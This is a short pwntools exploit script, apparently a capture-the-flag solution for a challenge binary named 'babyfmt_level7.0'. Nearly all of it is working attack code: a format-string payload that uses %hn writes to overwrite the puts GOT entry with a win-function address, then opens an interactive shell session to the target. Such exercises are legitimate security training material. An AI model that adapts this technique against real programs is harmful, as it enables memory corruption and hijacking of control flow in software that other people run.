#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyfmt_level7.0")

context.binary = exe



gdb_script = """
b *func+358
c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,gdb_script)
    else:
        r = remote("addr", 1337)

    return r


win_addr = 0x401540
puts_got = 0x404020


def main():
    r = conn()

    # good luck pwning :)
    payload = b"%18$hn%17$hn%64c%16$hn%5396c%15$hnAAAAAA" + p64(0x404020) + p64(0x404022) + p64(0x404024) + p64(0x404026) + b"END"
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
